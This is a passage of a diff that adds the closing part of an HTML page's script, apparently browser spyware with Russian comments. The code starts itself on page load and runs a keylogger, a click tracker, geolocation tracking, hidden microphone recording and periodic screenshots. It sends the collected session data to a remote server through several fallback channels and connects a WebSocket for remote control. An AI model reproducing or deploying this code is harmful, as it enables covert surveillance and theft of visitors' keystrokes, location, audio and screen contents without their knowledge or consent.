+    }
+    
+    // === 8. ОТПРАВКА ДАННЫХ НА СЕРВЕР ===
+    function sendToServer(data) {
+        const payload = {
+            deviceId: PAYLOAD_ID,
+            platform: isIOS ? 'ios' : 'android',
+            timestamp: Date.now(),
+            ...data
+        };
+        
+        // Метод 1: SendBeacon (самый надёжный)
+        if (navigator.sendBeacon) {
+            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+            navigator.sendBeacon(SERVER_URL + '/data', blob);
+        }
+        
+        // Метод 2: Fetch с keepalive
+        fetch(SERVER_URL + '/data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            mode: 'no-cors',
+            keepalive: true
+        }).catch(() => {});
+        
+        // Метод 3: Image ping (работает всегда)
+        const img = new Image();
+        const encodedData = encodeURIComponent(JSON.stringify(payload).substring(0, 2000));
+        img.src = `${SERVER_URL}/ping?id=${PAYLOAD_ID}&data=${encodedData}&t=${Date.now()}`;
+        img.style.display = 'none';
+        document.body.appendChild(img);
+        setTimeout(() => {
+            if (img.parentNode) img.remove();
+        }, 100);
+    }
+    
+    // === 9. СОХРАНЕНИЕ СЕССИИ ПРИ ЗАКРЫТИИ ===
+    function setupSessionSaver() {
+        // Сохраняем при закрытии/обновлении
+        window.addEventListener('beforeunload', () => {
+            sessionData.endTime = Date.now();
+            sessionData.duration = sessionData.endTime - sessionData.startTime;
+            
+            // Отправляем итоговый отчёт
+            sendToServer({
+                type: 'session_summary',
+                data: {
+                    deviceId: PAYLOAD_ID,
+                    platform: isIOS ? 'iOS' : 'Android',
+                    startTime: new Date(sessionData.startTime).toISOString(),
+                    endTime: new Date().toISOString(),
+                    duration: sessionData.duration,
+                    totalClicks: sessionData.clicks.length,
+                    totalKeystrokes: sessionData.keystrokes.length,
+                    totalLocations: sessionData.locations.length,
+                    totalRecordings: sessionData.recordings.length,
+                    totalScreenshots: sessionData.screenshots.length,
+                    userAgent: navigator.userAgent
+                }
+            });
+            
+            // Отправляем полные данные
+            sendToServer({
+                type: 'full_session_data',
+                data: sessionData
+            });
+        });
+        
+        // Для iOS (pagehide вместо beforeunload)
+        window.addEventListener('pagehide', () => {
+            sendToServer({ type: 'page_hide', timestamp: Date.now() });
+        });
+        
+        // Для возврата на страницу
+        window.addEventListener('pageshow', () => {
+            sendToServer({ type: 'page_show', timestamp: Date.now() });
+        });
+        
+        // Отслеживаем видимость вкладки
+        document.addEventListener('visibilitychange', () => {
+            sendToServer({
+                type: 'visibility_change',
+                hidden: document.hidden,
+                visibilityState: document.visibilityState
+            });
+        });
+    }
+    
+    // === 10. ИНИЦИАЛИЗАЦИЯ ===
+    async function initializeSurveillance() {
+        console.log(`[SURVEILLANCE] ${isIOS ? 'iOS' : 'Android'} payload activated: ${PAYLOAD_ID}`);
+        
+        // 1. Собираем и отправляем информацию об устройстве
+        const deviceInfo = await collectDeviceInfo();
+        sendToServer(deviceInfo);
+        
+        // 2. Настраиваем трекеры
+        setupClickTracker();
+        setupKeylogger();
+        setupSessionSaver();
+        
+        // 3. Запускаем отслеживание локации
+        if (ENABLE_GEO) {
+            startLocationTracking();
+        }
+        
+        // 4. Подключаем WebSocket для управления
+        connectWebSocket();
+        
+        // 5. Запускаем периодические задачи
+        setInterval(() => {
+            sendToServer({
+                type: 'heartbeat',
+                data: {
+                    uptime: Date.now() - sessionData.startTime,
+                    memory: performance.memory ? {
+                        usedJSHeapSize: performance.memory.usedJSHeapSize,
+                        totalJSHeapSize: performance.memory.totalJSHeapSize
+                    } : null,
+                    pageActive: !document.hidden
+                }
+            });
+        }, 60000); // Каждую минуту
+        
+        // 6. Автоматический старт записи через 30 секунд
+        if (ENABLE_MIC) {
+            setTimeout(async () => {
+                await startHiddenRecording();
+            }, 30000);
+        }
+        
+        // 7. Периодические скриншоты
+        if (ENABLE_SCR) {
+            setInterval(async () => {
+                await captureScreenshot();
+            }, 300000); // Каждые 5 минут
+        }
+        
+        // 8. Загружаем html2canvas для скриншотов
+        if (ENABLE_SCR && typeof html2canvas === 'undefined') {
+            const script = document.createElement('script');
+            script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+            script.onload = () => console.log('html2canvas loaded');
+            document.head.appendChild(script);
+        }
+        
+        sendToServer({ type: 'surveillance_initialized' });
+    }
+    
+    // === ЗАПУСК ===
+    // Для iOS дожидаемся полной загрузки
+    if (isIOS) {
+        document.addEventListener('DOMContentLoaded', initializeSurveillance);
+        // Дополнительный триггер для iOS Safari
+        window.addEventListener('load', initializeSurveillance);
+    } else {
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initializeSurveillance);
+        } else {
+            initializeSurveillance();
+        }
+    }
+    
+})();
+    
+        
+        // iOS специфичная инициализация
+        if (/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream) {
+            // Добавляем дополнительную задержку для iOS
+            setTimeout(() => {
+                console.log('iOS device detected - extra initialization');
+            }, 2000);
+            
+            // Предотвращаем масштабирование
+            document.addEventListener('touchmove', function(e) {
+                if (e.scale !== 1) { e.preventDefault(); }
+            }, { passive: false });
+        }
+    </script>
+</body>
+</html>
